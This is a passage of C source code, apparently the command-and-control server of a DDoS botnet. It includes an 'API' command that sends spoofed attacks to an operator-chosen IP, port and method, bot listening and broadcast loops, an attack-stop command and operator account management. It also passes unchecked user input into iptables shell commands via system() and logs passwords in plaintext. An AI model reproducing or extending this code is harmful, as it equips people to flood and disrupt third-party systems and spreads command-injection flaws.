						read(datafd, bannie111, sizeof(bannie111));
						trim(bannie111);
						char banmsg[80];
                		sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);
                		sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);
		
                		system(commandban);
                		system(commandban1);
                		LogFile2 = fopen("ip.ban.unban.log", "a");
    		
                		fprintf(LogFile2, "[banned] |ip:%s|\n", bannie111);
                		fclose(LogFile2);
		
                		sprintf(banmsg, "ip:%s is banned\r\n", bannie111);
		
                		if(send(datafd, banmsg,  strlen(banmsg),	MSG_NOSIGNAL) == -1) goto end; 
		
						pthread_create(&title, NULL, &TitleWriter, sock);
						char input [5000];
        				sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
        				
						if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
						continue;
					}
				}
		if(strstr(buf, "API"))
        {
        	pthread_create(&title, NULL, &TitleWriter, sock);
        	char bener[1024];
            char ip[80];
            char port[80];
            char time[80];
            char method[80];

            sprintf(bener, "IP: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(ip, buf);

            sprintf(bener, "Port: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(port, buf);

            sprintf(bener, "Time: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(time, buf);

            sprintf(bener, "Method: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(method, buf);

            if(apicall("spoofed", ip, port, time, method));

            sprintf(bener, "Attack Successfully Sent!");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;

            char input [5000];
        	sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
			if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
			continue;
			}

				if(strstr(buf, "unbanip")) 
				{
					if(!strcmp(accounts[find_line].admin, "admin"))
					{
				pthread_create(&title, NULL, &TitleWriter, sock);
                char bannie1 [800];
                char commandunban[80];
                char commandunban1[80];

                if(send(datafd, "\x1b[0mip: \x1b[96m", strlen("\x1b[0mip: \x1b[96m"), MSG_NOSIGNAL) == -1) goto end;
				memset(bannie1, 0, sizeof(bannie1));
				read(datafd, bannie1, sizeof(bannie1));
				trim(bannie1);

				char unbanmsg[80];

                sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
                sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

                system(commandunban);
                system(commandunban1);
                LogFile2 = fopen("ip.ban.unban.log", "a");
    
                fprintf(LogFile2, "[unbanned] |ip:%s|\n", bannie1);
                fclose(LogFile2);

                sprintf(unbanmsg, "ip:%s is unbanned\r\n", bannie1);

                if(send(datafd, unbanmsg,  strlen(unbanmsg),	MSG_NOSIGNAL) == -1) goto end;  

				pthread_create(&title, NULL, &TitleWriter, sock);
				char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);

						if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
						continue;
					}
				}
			     if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
       		{
        	if(!strcmp(accounts[find_line].admin, "admin"))
        	{
				pthread_create(&title, NULL, &TitleWriter, sock);
				char gang [801];
                char support11 [801];
                char supportmsg11 [801];

                sprintf(gang,  "\e[96mTo add a user do it in this format [username password admin] you dont need the admin unless its admin ofc\e[96m\r\n");  
                if(send(datafd, "\x1b[0mFormat: \x1b[96m", strlen("\x1b[0mFormat: \x1b[96m"), MSG_NOSIGNAL) == -1) goto end;
				memset(support11, 0, sizeof(support11));//to add admin just add admin to the end
				read(datafd, support11, sizeof(support11));
				trim(support11);

                FILE *filez;
                filez = fopen("users/login.txt", "a");
    
                fprintf(filez, "\n%s\n", support11);
                fclose(filez);

                sprintf(supportmsg11,  "\e[96m [%s] added ;)\e[96m\r\n", support11);  

                if(send(datafd, supportmsg11,  strlen(supportmsg11),	MSG_NOSIGNAL) == -1) goto end;                 

				pthread_create(&title, NULL, &TitleWriter, sock);

		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
		}
	}
           //yeet
				if(strstr(buf, "support") || strstr(buf, "SUPPORT") || strstr(buf, "Support")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
                char support [800];
                char supportmsg [800];

                if(send(datafd, "\x1b[0mMsg: \x1b[96m", strlen("\x1b[0mMsg: \x1b[96m"), MSG_NOSIGNAL) == -1) goto end;
				memset(support, 0, sizeof(support));
				read(datafd, support, sizeof(support));
				trim(support);

                FILE *LogFilesupport;
                LogFilesupport = fopen("logs/ticket.txt", "a");
    
                fprintf(LogFilesupport, "[User:%s] |%s|\n", userlog, support);
                fclose(LogFilesupport);

                sprintf(supportmsg,  "\e[96mticket open\e[96m\r\n");  

                if(send(datafd, supportmsg,  strlen(supportmsg),	MSG_NOSIGNAL) == -1) goto end;                 

				pthread_create(&title, NULL, &TitleWriter, sock);

		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* STOP") || strstr(buf, "!* stop") || strstr(buf, "!* Stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[96m ok.\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
                if(send(datafd, clearscreen,  strlen(clearscreen),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;  
        while(1) {
        	
		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
            trim(buf);
		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("logs/logs.txt", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[sent at %s]: %s | Info: %s:%s:%s |\n", formatted_gmt, buf, userlog, accounts[find_line].password, ipinfo);
            fclose(LogFile);
            broadcast(buf, datafd, userlog);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }


        	printf("\e[1;31mscreened retard press crl a+d . \r\n"); 

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
//woah helped